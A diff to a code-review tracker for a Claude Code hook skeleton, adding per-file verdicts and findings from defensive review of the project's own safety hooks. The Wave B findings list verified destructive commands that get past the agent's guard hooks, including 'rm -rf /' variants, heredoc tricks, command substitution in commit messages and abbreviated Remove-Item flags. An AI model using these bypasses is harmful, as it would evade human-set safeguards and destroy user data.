@@ -48,41 +48,41 @@ Severity scale: BLOCKER-for-strangers / SHOULD-FIX / COSMETIC. CLEAN is a legiti
 | file | lines | reviewed at | verdict |
 |---|---|---|---|
 | .claude/hooks/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| .claude/hooks/README.md | 49 | — | — |
-| .claude/hooks/precompact-backup.sh | 33 | — | — |
-| .claude/hooks/pretooluse-bash-safety.sh | 157 | — | — |
-| .claude/hooks/pretooluse-powershell-safety.sh | 167 | — | — |
-| .claude/hooks/sessionend-cost-proposals.sh | 228 | — | — |
-| .claude/hooks/sessionend-observe.sh | 55 | — | — |
-| .claude/hooks/sessionstart-cost-summary.sh | 325 | — | — |
-| .claude/hooks/sessionstart-rules.sh | 155 | — | — |
-| .claude/lib/destructive-bash-patterns.sh | 30 | — | — |
-| .claude/lib/destructive-powershell-patterns.sh | 33 | — | — |
-| .claude/lib/generate-session-telemetry.sh | 526 | — | — |
-| .claude/lib/migrate-observation-privacy.sh | 85 | — | — |
-| .claude/lib/redact-capture.sh | 122 | — | — |
-| .claude/lib/redact-observation.sh | 125 | — | — |
-| .claude/lib/shared-memory-git.sh | 94 | — | — |
-| .claude/lib/shared-memory-lib.sh | 146 | — | — |
-| .claude/lib/shared-memory.schema.md | 55 | — | — |
+| .claude/hooks/README.md | 49 | 8f5ae35 | 1 COSMETIC |
+| .claude/hooks/precompact-backup.sh | 33 | 8f5ae35 | 2 SHOULD-FIX |
+| .claude/hooks/pretooluse-bash-safety.sh | 157 | 8f5ae35 | 2 BLOCKER / 3 SHOULD-FIX |
+| .claude/hooks/pretooluse-powershell-safety.sh | 167 | 8f5ae35 | 2 BLOCKER / 1 SHOULD-FIX |
+| .claude/hooks/sessionend-cost-proposals.sh | 228 | 8f5ae35 | 1 SHOULD-FIX / 1 COSMETIC |
+| .claude/hooks/sessionend-observe.sh | 55 | 8f5ae35 | 1 SHOULD-FIX / 1 COSMETIC |
+| .claude/hooks/sessionstart-cost-summary.sh | 325 | 8f5ae35 | CLEAN |
+| .claude/hooks/sessionstart-rules.sh | 155 | 8f5ae35 | 1 SHOULD-FIX / 2 COSMETIC |
+| .claude/lib/destructive-bash-patterns.sh | 30 | 8f5ae35 | 1 BLOCKER / 2 SHOULD-FIX |
+| .claude/lib/destructive-powershell-patterns.sh | 33 | 8f5ae35 | 1 BLOCKER / 2 SHOULD-FIX |
+| .claude/lib/generate-session-telemetry.sh | 526 | 8f5ae35 | 1 SHOULD-FIX / 2 COSMETIC |
+| .claude/lib/migrate-observation-privacy.sh | 85 | 8f5ae35 | CLEAN |
+| .claude/lib/redact-capture.sh | 122 | 8f5ae35 | 1 SHOULD-FIX / 2 COSMETIC |
+| .claude/lib/redact-observation.sh | 125 | 8f5ae35 | 1 COSMETIC |
+| .claude/lib/shared-memory-git.sh | 94 | 8f5ae35 | 1 COSMETIC |
+| .claude/lib/shared-memory-lib.sh | 146 | 8f5ae35 | 2 SHOULD-FIX |
+| .claude/lib/shared-memory.schema.md | 55 | 8f5ae35 | CLEAN |
 | template/.claude/hooks/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| template/.claude/hooks/README.md | 49 | — | — |
-| template/.claude/hooks/precompact-backup.sh | 33 | — | — |
-| template/.claude/hooks/pretooluse-bash-safety.sh | 157 | — | — |
-| template/.claude/hooks/pretooluse-powershell-safety.sh | 167 | — | — |
-| template/.claude/hooks/sessionend-cost-proposals.sh | 228 | — | — |
-| template/.claude/hooks/sessionend-observe.sh | 55 | — | — |
-| template/.claude/hooks/sessionstart-cost-summary.sh | 325 | — | — |
-| template/.claude/hooks/sessionstart-rules.sh | 155 | — | — |
-| template/.claude/lib/destructive-bash-patterns.sh | 30 | — | — |
-| template/.claude/lib/destructive-powershell-patterns.sh | 33 | — | — |
-| template/.claude/lib/generate-session-telemetry.sh | 526 | — | — |
-| template/.claude/lib/migrate-observation-privacy.sh | 85 | — | — |
-| template/.claude/lib/redact-capture.sh | 122 | — | — |
-| template/.claude/lib/redact-observation.sh | 125 | — | — |
-| template/.claude/lib/shared-memory-git.sh | 94 | — | — |
-| template/.claude/lib/shared-memory-lib.sh | 146 | — | — |
-| template/.claude/lib/shared-memory.schema.md | 55 | — | — |
+| template/.claude/hooks/README.md | 49 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/hooks/precompact-backup.sh | 33 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/hooks/pretooluse-bash-safety.sh | 157 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/hooks/pretooluse-powershell-safety.sh | 167 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/hooks/sessionend-cost-proposals.sh | 228 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/hooks/sessionend-observe.sh | 55 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/hooks/sessionstart-cost-summary.sh | 325 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/hooks/sessionstart-rules.sh | 155 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/lib/destructive-bash-patterns.sh | 30 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/lib/destructive-powershell-patterns.sh | 33 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/lib/generate-session-telemetry.sh | 526 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/lib/migrate-observation-privacy.sh | 85 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/lib/redact-capture.sh | 122 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/lib/redact-observation.sh | 125 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/lib/shared-memory-git.sh | 94 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/lib/shared-memory-lib.sh | 146 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
+| template/.claude/lib/shared-memory.schema.md | 55 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
 
 ## Wave C — config, schemas, fixtures, CI, seeds (21 files, 5,229 lines)
 
@@ -202,79 +202,79 @@ Severity scale: BLOCKER-for-strangers / SHOULD-FIX / COSMETIC. CLEAN is a legiti
 
 | file | lines | reviewed at | verdict |
 |---|---|---|---|
-| COMMERCIAL.md | 21 | — | — |
-| LICENSE | 102 | — | — |
-| README.md | 95 | — | — |
-| docs/ARCHITECTURE.md | 185 | — | — |
-| docs/CHANGELOG.md | 353 | — | — |
-| docs/GETTING-STARTED.md | 160 | — | — |
-| docs/PLUGINS-GETTING-STARTED.md | 123 | — | — |
-| docs/ROADMAP.md | 329 | — | — |
-| docs/STORY.md | 120 | — | — |
+| COMMERCIAL.md | 21 | 8f5ae35 | CLEAN |
+| LICENSE | 102 | 8f5ae35 | CLEAN |
+| README.md | 95 | 8f5ae35 | 1 SHOULD-FIX |
+| docs/ARCHITECTURE.md | 185 | 8f5ae35 | 2 COSMETIC |
+| docs/CHANGELOG.md | 353 | 8f5ae35 | CLEAN |
+| docs/GETTING-STARTED.md | 160 | 8f5ae35 | 2 BLOCKER / 2 SHOULD-FIX |
+| docs/PLUGINS-GETTING-STARTED.md | 123 | 8f5ae35 | 1 COSMETIC |
+| docs/ROADMAP.md | 329 | 8f5ae35 | 1 BLOCKER / 1 SHOULD-FIX / 1 COSMETIC |
+| docs/STORY.md | 120 | 8f5ae35 | 1 BLOCKER |
 
 ## Wave F — everything remaining (59 files, 6,140 lines)
 
 | file | lines | reviewed at | verdict |
 |---|---|---|---|
-| .claude/.skeleton-version | 180 | — | — |
+| .claude/.skeleton-version | 180 | 8f5ae35 | CLEAN |
 | .claude/captures/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| .claude/captures/6f7e14b7176e480c04f38c4383ca09763bdc2b9015ac4eedcaeba3ca6e59cac8.md | 56 | — | — |
-| .claude/captures/README.md | 42 | — | — |
-| .claude/captures/fe22198210607aea481ac447d5620d9450b7f5d6e6d9dcdf3a2fd9dacb1b3f75.md | 43 | — | — |
+| .claude/captures/6f7e14b7176e480c04f38c4383ca09763bdc2b9015ac4eedcaeba3ca6e59cac8.md | 56 | 8f5ae35 | CLEAN |
+| .claude/captures/README.md | 42 | 8f5ae35 | 1 SHOULD-FIX |
+| .claude/captures/fe22198210607aea481ac447d5620d9450b7f5d6e6d9dcdf3a2fd9dacb1b3f75.md | 43 | 8f5ae35 | CLEAN |
 | .claude/observations/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| .claude/observations/README.md | 30 | — | — |
+| .claude/observations/README.md | 30 | 8f5ae35 | CLEAN |
 | .claude/scripts/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
 | .claude/scripts/drafts/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| .claude/scripts/drafts/README.md | 55 | — | — |
-| .claude/specs/README.md | 27 | — | — |
-| .claude/specs/propagate-skeleton-tv-eog.md | 84 | — | — |
-| .claude/telemetry/README.md | 34 | — | — |
+| .claude/scripts/drafts/README.md | 55 | 8f5ae35 | CLEAN |
+| .claude/specs/README.md | 27 | 8f5ae35 | CLEAN |
+| .claude/specs/propagate-skeleton-tv-eog.md | 84 | 8f5ae35 | CLEAN |
+| .claude/telemetry/README.md | 34 | 8f5ae35 | 1 SHOULD-FIX |
 | .claude/telemetry/events/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| .claude/telemetry/model-pricing.json | 22 | — | — |
-| .claude/telemetry/optimizer-proposals.json | 152 | — | — |
-| .claude/telemetry/retier-proposals.json | 19 | — | — |
+| .claude/telemetry/model-pricing.json | 22 | 8f5ae35 | CLEAN |
+| .claude/telemetry/optimizer-proposals.json | 152 | 8f5ae35 | CLEAN |
+| .claude/telemetry/retier-proposals.json | 19 | 8f5ae35 | CLEAN |
 | .claude/telemetry/sessions/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| VERSION | 1 | — | — |
-| docs/AUDIT-2026-07-27-spotter-state.md | 167 | — | — |
-| docs/AUDIT-v1.1.4-cc-side.md | 338 | — | — |
-| docs/AUDIT-v1.1.4-marker-refresh-dryrun.md | 159 | — | — |
-| docs/AUDIT-v1.1.4-state.md | 962 | — | — |
-| docs/HOOK_SCHEMA.md | 50 | — | — |
-| docs/INSTALLATION.md | 380 | — | — |
-| docs/PHILOSOPHY.md | 97 | — | — |
-| docs/PLUGIN-INSTALLS-v1.1.4.md | 701 | — | — |
-| docs/scratch/claude-manager-reframe-audit.md | 82 | — | — |
-| docs/scratch/claude-md-reframe-audit.md | 91 | — | — |
-| docs/scratch/phase-36-framework.md | 71 | — | — |
-| experiments/confidence/.gitignore | 5 | — | — |
-| experiments/confidence/ANALYSIS.md | 92 | — | — |
-| experiments/confidence/MANIFEST_HEADER.md | 28 | — | — |
-| experiments/confidence/README.md | 13 | — | — |
-| experiments/confidence/analysis.py | 369 | — | — |
-| experiments/confidence/harness.py | 167 | — | — |
-| experiments/confidence/real_manifest.json | 713 | — | — |
-| experiments/confidence/scatter_agreement_all.png | 172 | — | — |
-| experiments/confidence/scatter_agreement_gap.png | 115 | — | — |
-| experiments/reviewer-behavior/DESIGN.md | 211 | — | — |
+| VERSION | 1 | 8f5ae35 | CLEAN |
+| docs/AUDIT-2026-07-27-spotter-state.md | 167 | 8f5ae35 | CLEAN |
+| docs/AUDIT-v1.1.4-cc-side.md | 338 | 8f5ae35 | CLEAN |
+| docs/AUDIT-v1.1.4-marker-refresh-dryrun.md | 159 | 8f5ae35 | CLEAN |
+| docs/AUDIT-v1.1.4-state.md | 962 | 8f5ae35 | CLEAN |
+| docs/HOOK_SCHEMA.md | 50 | 8f5ae35 | CLEAN |
+| docs/INSTALLATION.md | 380 | 8f5ae35 | 1 COSMETIC |
+| docs/PHILOSOPHY.md | 97 | 8f5ae35 | 2 COSMETIC |
+| docs/PLUGIN-INSTALLS-v1.1.4.md | 701 | 8f5ae35 | 2 SHOULD-FIX |
+| docs/scratch/claude-manager-reframe-audit.md | 82 | 8f5ae35 | CLEAN |
+| docs/scratch/claude-md-reframe-audit.md | 91 | 8f5ae35 | CLEAN |
+| docs/scratch/phase-36-framework.md | 71 | 8f5ae35 | CLEAN |
+| experiments/confidence/.gitignore | 5 | 8f5ae35 | CLEAN |
+| experiments/confidence/ANALYSIS.md | 92 | 8f5ae35 | 1 SHOULD-FIX |
+| experiments/confidence/MANIFEST_HEADER.md | 28 | 8f5ae35 | CLEAN |
+| experiments/confidence/README.md | 13 | 8f5ae35 | CLEAN |
+| experiments/confidence/analysis.py | 369 | 8f5ae35 | 1 SHOULD-FIX |
+| experiments/confidence/harness.py | 167 | 8f5ae35 | CLEAN |
+| experiments/confidence/real_manifest.json | 713 | 8f5ae35 | 1 COSMETIC |
+| experiments/confidence/scatter_agreement_all.png | 172 | 8f5ae35 | CLEAN |
+| experiments/confidence/scatter_agreement_gap.png | 115 | 8f5ae35 | CLEAN |
+| experiments/reviewer-behavior/DESIGN.md | 211 | 8f5ae35 | 1 COSMETIC |
 | template/.claude/captures/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| template/.claude/captures/README.md | 42 | — | — |
+| template/.claude/captures/README.md | 42 | 8f5ae35 | 1 SHOULD-FIX |
 | template/.claude/observations/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| template/.claude/observations/README.md | 30 | — | — |
+| template/.claude/observations/README.md | 30 | 8f5ae35 | CLEAN |
 | template/.claude/scripts/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
 | template/.claude/scripts/drafts/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| template/.claude/scripts/drafts/README.md | 55 | — | — |
+| template/.claude/scripts/drafts/README.md | 55 | 8f5ae35 | CLEAN |
 | template/.claude/specs/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| template/.claude/specs/README.md | 27 | — | — |
-| template/.claude/telemetry/README.md | 34 | — | — |
+| template/.claude/specs/README.md | 27 | 8f5ae35 | CLEAN |
+| template/.claude/telemetry/README.md | 34 | 8f5ae35 | 1 SHOULD-FIX |
 | template/.claude/telemetry/events/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| template/.claude/telemetry/model-pricing.json | 22 | — | — |
-| template/.claude/telemetry/optimizer-proposals.json | 19 | — | — |
-| template/.claude/telemetry/retier-proposals.json | 19 | — | — |
+| template/.claude/telemetry/model-pricing.json | 22 | 8f5ae35 | CLEAN |
+| template/.claude/telemetry/optimizer-proposals.json | 19 | 8f5ae35 | CLEAN |
+| template/.claude/telemetry/retier-proposals.json | 19 | 8f5ae35 | CLEAN |
 | template/.claude/telemetry/sessions/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
-| template/PLUGINS.md.template | 27 | — | — |
-| template/docs/ARCHITECTURE.md.template | 51 | — | — |
-| template/docs/SESSION_LOG.md.template | 40 | — | — |
-| template/docs/STATUS.md.template | 46 | — | — |
+| template/PLUGINS.md.template | 27 | 8f5ae35 | 1 SHOULD-FIX |
+| template/docs/ARCHITECTURE.md.template | 51 | 8f5ae35 | CLEAN |
+| template/docs/SESSION_LOG.md.template | 40 | 8f5ae35 | CLEAN |
+| template/docs/STATUS.md.template | 46 | 8f5ae35 | CLEAN |
 
 ### Wave A findings
 
@@ -382,6 +382,135 @@ Severity scale: BLOCKER-for-strangers / SHOULD-FIX / COSMETIC. CLEAN is a legiti
   - evidence: resolve_skeleton_root sets SOURCE_PATH to a mktemp dir that cleanup deletes; write_version_marker persists it via portable_source_path (a temp path is neither <self> nor under $HOME on most systems), so the migration fallback at line 578 can never use it. Harmless but misleading provenance.
 - **COSMETIC** — `scripts/update.sh:1137` — Typo 'entrie(s)' in user-facing output (lines 1137 and 1174)
   - evidence: printf 'match-rebaseline: %s entrie(s)…' — should be 'entry(ies)' or just 'entries'.
+
+### Wave F findings
+
+- **SHOULD-FIX** — `.claude/captures/README.md:37` — Producers section lists only workflow-suggester, but artifact-fit-analyzer (Phase 56) also writes captures — proven by the shipped capture 6f7e14b7...md in this very directory, which self-describes 'Producer: artifact-fit-analyzer (Phase 56, non-observation producer — no observation file backs this capture)'.
+  - evidence: Line 37: '**`workflow-suggester`** — drafts captures from observations...' is the sole producer entry; .claude/captures/6f7e14b7176e480c04f38c4383ca09763bdc2b9015ac4eedcaeba3ca6e59cac8.md lines 14-15 name artifact-fit-analyzer as producer. The line-7 claim that 'the filename matches the pattern_id of the observation' also fails for this non-observation-backed capture.
+- **SHOULD-FIX** — `.claude/telemetry/README.md:10` — Claims the cross-install summary lives at '.claude/observations/token-telemetry-<session_id>.json', but the generator now writes hash-named '<pattern_id>.json' observations — the token-telemetry-* naming is explicitly the OLD scheme per the generator's own comments, and zero files matching it exist among 224 observations.
+  - evidence: .claude/lib/generate-session-telemetry.sh:475-477 comment: 'The old human-readable token-telemetry-<session_id>.json ... pattern_id stays sha256(pattern_type + signature)'; ls .claude/observations/ | grep -c token-telemetry returns 0. The same stale path repeats at line 24 (Privacy section). Contradicts observations/README.md's '<pattern_id>.json' contract.
+- **SHOULD-FIX** — `docs/PLUGIN-INSTALLS-v1.1.4.md:31` — Verbatim installed_plugins.json quote freezes the operator's Windows username in a machine-absolute path in a public-repo doc.
+  - evidence: "installPath": "C:\\Users\\darre\\.claude\\plugins\\cache\\claude-plugins-official\\42crunch-api-security-testing\\1.0.1" — contrast with docs/AUDIT-v1.1.4-cc-side.md line 38, which redacted the same marker field to 'source: <project-root>'. The repo's own Phase 81 'marker privacy' work (per docs/AUDIT-2026-07-27-spotter-state.md line 92) shows this class was later treated as ship-blocking; redact to <home>\.claude\... without losing the record's meaning.
+- **SHOULD-FIX** — `docs/PLUGIN-INSTALLS-v1.1.4.md:564` — Second verbatim installPath quote (claude-mem 13.2.0 diff) repeats the same username-bearing absolute path.
+  - evidence: "installPath": "C:\\Users\\darre\\.claude\\plugins\\cache\\thedotmack\\claude-mem\\13.2.0" — same class as line 31; both are the only 'darre' hits across all eight reviewed files (grep-verified).
+- **SHOULD-FIX** — `experiments/confidence/ANALYSIS.md:51` — The chance-floor caption's parenthetical values contradict the table's own computed column: caption says k=2: 0.651, k=3: 0.527, k=5: 0.423, k=9: 0.345, but the exact computation (and the table column) gives 0.656, 0.525, 0.410, 0.328.
+  - evidence: Independently recomputed E[modal count]/N for N=7 uniform draws: k=2 -> 0.656, k=3 -> 0.525, k=5 -> 0.410, k=9 -> 0.328 — matching every 'chance floor' cell in the table (lines 19-49) and disagreeing with all four caption values on line 51. A stranger checking the caption against the table sees the analysis contradict itself; the RED verdict is unaffected.
+- **SHOULD-FIX** — `experiments/confidence/analysis.py:337` — Hardcoded chance-floor values in the md.append caption string (k=2: 0.651, k=3: 0.527, k=5: 0.423, k=9: 0.345) are wrong; the script's own exact_modal_floor computes 0.656, 0.525, 0.410, 0.328. The caption should be generated from exact_modal_floor instead of hardcoded.
+  - evidence: Line 336-337: md.append("\nChance floor = exact E[modal count]/N for uniform answers at N=7 (k=2: 0.651, k=3: 0.527, k=5: 0.423, k=9: 0.345)..."). exact_modal_floor(2)=0.65625, (3)=0.525, (5)=0.410, (9)=0.328 per independent recomputation, and those computed values are what the table rows emit at line 335.
+- **SHOULD-FIX** — `template/.claude/captures/README.md:37` — Same as dogfood copy: producers list omits artifact-fit-analyzer (Phase 56), which the template also ships as a capture producer.
+  - evidence: diff confirms template twin identical to .claude/captures/README.md; template/.claude/agents/05_meta ships artifact-fit-analyzer per the skeleton-version file map.
+- **SHOULD-FIX** — `template/.claude/telemetry/README.md:10` — Same as dogfood copy: stale '.claude/observations/token-telemetry-<session_id>.json' path at lines 10 and 24; shipped generator writes hash-named <pattern_id>.json.
+  - evidence: diff confirms template twin identical to .claude/telemetry/README.md.
+- **SHOULD-FIX** — `template/PLUGINS.md.template:5` — References docs/PHILOSOPHY.md unconditionally, but the template ships no PHILOSOPHY.md to target projects (template/docs/ contains only ARCHITECTURE, SESSION_LOG, STATUS templates) — so on every install this points at a file that does not exist. ARCHITECTURE.md.template hedges the same reference with '(if present)'; this file should too, or link the skeleton repo's copy.
+  - evidence: Line 5: 'This file is the *plugin discipline* record described in `docs/PHILOSOPHY.md` ("Plugin evaluation discipline").' ls template/docs/ shows ARCHITECTURE.md.template, SESSION_LOG.md.template, STATUS.md.template only; PHILOSOPHY.md exists only at the skeleton repo's docs/.
+- **COSMETIC** — `docs/INSTALLATION.md:305` — Uninstall file list omits PLUGINS.md and docs/ARCHITECTURE.md, both of which the template also installs (template/PLUGINS.md.template, template/docs/ARCHITECTURE.md.template).
+  - evidence: Lines 304-306 list only 'rm -f CLAUDE.md CLAUDE_MANAGER.md ROUTING.md' plus a comment naming docs/STATUS.md and docs/SESSION_LOG.md; template/ ships PLUGINS.md.template and docs/ARCHITECTURE.md.template which land on targets and would be left behind.
+- **COSMETIC** — `docs/PHILOSOPHY.md:21` — Section-routing example names a 'code-reviewer' agent as if it were a concrete shipped route; no such agent exists in .claude/agents/ (the audit lane ships audit-helper) and ROUTING.md has no code-reviewer entry.
+  - evidence: Line 21: 'A code review goes to the `code-reviewer` agent' — ls .claude/agents/02_audit/ shows only audit-helper.md; grep for code-reviewer in ROUTING.md returns nothing. Reads as a concrete handler to a stranger, in a paragraph that stresses routing is 'explicit... not vibes'.
+- **COSMETIC** — `docs/PHILOSOPHY.md:58` — 'Today this is enforced by review, not by code' is partially stale: plugin-quality-check.sh (self-described 'v1.1.4 first plugin-verification component') and the plugin-discovery checklist now automate parts of plugin verification, though the pre-add 5-question check itself remains manual.
+  - evidence: .claude/scripts/plugin-quality-check.sh header: 'read-only auditor of installed plugins... Implements 3 heuristics... first plugin-verification component; composes with cruft-checker + drift-checker as the project-level audit triad.'
+- **COSMETIC** — `experiments/confidence/real_manifest.json:6` — _meta.build_status still says 'Capture pending.' but the capture ran and resolved RED per ANALYSIS.md — stale relative to the shipped state of the experiment.
+  - evidence: "build_status": "Complete: 31 tasks (6 control / 5 stress / 20 gap). Capture pending." — while README.md and ANALYSIS.md in the same directory record the capture as complete and the RED verdict as final.
+- **COSMETIC** — `experiments/reviewer-behavior/DESIGN.md:158` — The feasibility table (and line 106's parenthetical) still carries the 2026-07-07 count of ~80 ExitPlanMode events for signal v, while the 2026-07-21 amendment's restated baseline (line 143) records v = 370 — both phrased as 'the current window' with no note that the table predates the amendment.
+  - evidence: Line 106: 'record 80 ExitPlanMode events in the current window'; line 158: '~80 gaps measured by the optimizer's first pass'; line 143: 'v = 370 ExitPlanMode events'. A stranger reading the feasibility table alone gets the stale count; a one-word '(at lock)' qualifier on the table would resolve it without touching the locked gate language.
+
+### Wave B findings
+
+- **BLOCKER-for-strangers** — `.claude/hooks/pretooluse-bash-safety.sh:104` — strip_bash_heredocs treats any `<<IDENT` on a line — including inside a comment, a quoted string, or a `<<<` here-string — as a heredoc opener, blanking every subsequent line so the pattern scan never sees it.
+  - evidence: Verified against the live hook: `# note <<EOF\nrm -rf /` => allow; `echo "see <<EOF for docs"\nrm -rf /` => allow; `cat <<<HELLO\nrm -rf /` => allow (regex matches the 2nd+3rd `<` of `<<<`). Baseline `rm -rf /` => deny.
+- **BLOCKER-for-strangers** — `.claude/hooks/pretooluse-bash-safety.sh:148` — Fail-OPEN when the lib file exists but is empty/truncated/syntax-broken: under bash 5 `"${ARR[@]}"` on an unset array is empty even with `set -u`, so the loop body never runs and every command is allowed with no signal.
+  - evidence: Verified: with CLAUDE_PROJECT_DIR pointed at a dir containing a zero-byte .claude/lib/destructive-bash-patterns.sh, `rm -rf /` => `permissionDecision: allow`, exit 0. Contradicts the file header's "Fail-closed" contract (line 10); a partial clone/copy of this template silently disarms the hook.
+- **BLOCKER-for-strangers** — `.claude/hooks/pretooluse-powershell-safety.sh:108` — strip_ps_herestrings opens a here-string on ANY line ending in `@"` or `@'`, including inside ordinary quoted text, blanking every following line until a closer that may never come.
+  - evidence: Verified: `Write-Host "mail a@"\nRemove-Item -Recurse -Force C:\foo` => allow, while the same Remove-Item alone => deny.
+- **BLOCKER-for-strangers** — `.claude/hooks/pretooluse-powershell-safety.sh:156` — Same fail-OPEN as the Bash hook when destructive-powershell-patterns.sh is present but empty/corrupt — unset array under bash 5 yields a zero-iteration loop and a blanket allow.
+  - evidence: Confirmed by the equivalent Bash-hook test (zero-byte lib => allow, exit 0); the code path here is identical (source at line 45, loop at 156, no post-source array-populated assertion).
+- **BLOCKER-for-strangers** — `.claude/lib/destructive-bash-patterns.sh:17` — The `rm -rf` pattern is defeated by flag order, flag splitting, long flags, or any non-space delimiter before `rm`.
+  - evidence: All verified => allow against the live hook: `rm -fr /`, `rm -r -f /`, `rm --recursive --force /`, `echo hi;rm -rf /`, `(rm -rf /)`, `\rm -rf /`. Only the literal ` rm -rf ` form denies. Fix shape: anchor `(^|[^[:alnum:]_./-])` and match `-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r|--recursive`.
+- **BLOCKER-for-strangers** — `.claude/lib/destructive-powershell-patterns.sh:19` — PowerShell accepts unambiguous parameter-name prefixes, but the regex only matches `-r`/`-recurse` and `-f`/`-force` exactly, so abbreviated flags bypass a genuinely destructive delete.
+  - evidence: Verified: `Remove-Item -rec -for C:\Windows` => allow (PowerShell executes this identically to `-Recurse -Force`), while `Remove-Item C:\Windows -Recurse -Force` => deny. Fix: `-r(e(c(u(r(s(e)?)?)?)?)?)?` style prefix matching.
+- **SHOULD-FIX** — `.claude/hooks/precompact-backup.sh:15` — Backups accumulate forever with no pruning — three files per auto-compact, and SESSION_LOG.md is a growing document, so the gitignored precompact-backups/ dir grows without bound on a long-lived install
+  - evidence: Every PreCompact fire copies STATUS.md + SESSION_LOG.md + CLAUDE.md with a unique UTC timestamp suffix and nothing ever deletes old ones; a heavy multi-compact-per-day project stores hundreds of copies of its largest doc within months.
+- **SHOULD-FIX** — `.claude/hooks/precompact-backup.sh:15` — BACKUP_DIR and the three source paths are cwd-relative, not anchored to CLAUDE_PROJECT_DIR like the sibling hooks
+  - evidence: If hook cwd differs from project root, the script silently backs up nothing (docs/STATUS.md not found) and mkdir -p creates a stray .claude/agent-memory/precompact-backups tree in the wrong directory — the ${CLAUDE_PROJECT_DIR:-$PWD} pattern used at sessionstart-cost-summary.sh:21 fixes both.
+- **SHOULD-FIX** — `.claude/hooks/pretooluse-bash-safety.sh:34` — The lib-missing fail-closed payload is hand-built with printf and interpolates $LIB unescaped — a Windows-style CLAUDE_PROJECT_DIR produces invalid JSON escapes, so the deny may not be parsed at all.
+  - evidence: Verified: CLAUDE_PROJECT_DIR='C:\no\such\dir' emits `...lib missing at C:\no\such\dir/.claude/...` and `jq .` on the output reports INVALID JSON. Same defect in the jq-missing branch (line 116) if the reason ever gains a path.
+- **SHOULD-FIX** — `.claude/hooks/pretooluse-bash-safety.sh:64` — The `git commit -m` carve-out redacts the message body but not command substitutions inside it, which the shell still executes.
+  - evidence: Verified: `git commit -m "$(rm -rf /tmp/x)"` => allow. The sed replaces the quoted body with "X", but bash expands `$(...)` before git ever runs.
+- **SHOULD-FIX** — `.claude/hooks/pretooluse-bash-safety.sh:132` — Cross-shell blind spot: the Bash hook applies only Bash patterns, so a destructive PowerShell command launched from Bash passes.
+  - evidence: Verified: tool_name=Bash with `powershell.exe -c "Remove-Item -Recurse -Force C:\Users\darre\Dev"` => allow. Symmetric hole in the PowerShell hook (`bash -c "rm -rf ..."` => allow).
+- **SHOULD-FIX** — `.claude/hooks/pretooluse-powershell-safety.sh:40` — Hand-built lib-missing deny payload interpolates $LIB into JSON without escaping; Windows backslash paths make the payload unparseable.
+  - evidence: Same construction as the Bash hook line 34, which was verified to emit INVALID JSON for CLAUDE_PROJECT_DIR='C:\no\such\dir'.
+- **SHOULD-FIX** — `.claude/hooks/sessionend-cost-proposals.sh:179` — The human-disposition gate is just field presence — any writer of a *.draft.json can set status 'approved'/'applied' plus a non-empty review_note and it folds into the ledger with that status preserved, no human in the loop
+  - evidence: Lines 179-182: disposed = status in ('approved','applied','rejected'); reviewed = non-empty review_note string; the comment asserts 'the pair only a review writes' but nothing verifies provenance, so a buggy or prompt-injected producer that stages a draft with both fields self-approves through the seam, undercutting the stated 'nothing self-approves through the fold' invariant.
+- **SHOULD-FIX** — `.claude/hooks/sessionend-observe.sh:33` — ${CLAUDE_PROJECT_DIR:?...} aborts the hook with exit 1 before any work when the var is unset — the only hook in the suite that hard-fails instead of falling back
+  - evidence: Run the hook without CLAUDE_PROJECT_DIR (manual invocation, or any harness that doesn't export it): bash errors 'CLAUDE_PROJECT_DIR not set' and exits 1; sessionstart-cost-summary.sh:21 and sessionend-cost-proposals.sh:25 both use ${CLAUDE_PROJECT_DIR:-$PWD} for exactly this case.
+- **SHOULD-FIX** — `.claude/hooks/sessionstart-rules.sh:41` — All paths (settings.json, scripts, markers, .first-run) are cwd-relative while sibling hooks use ROOT="${CLAUDE_PROJECT_DIR:-$PWD}" and settings.json invokes via absolute $CLAUDE_PROJECT_DIR paths
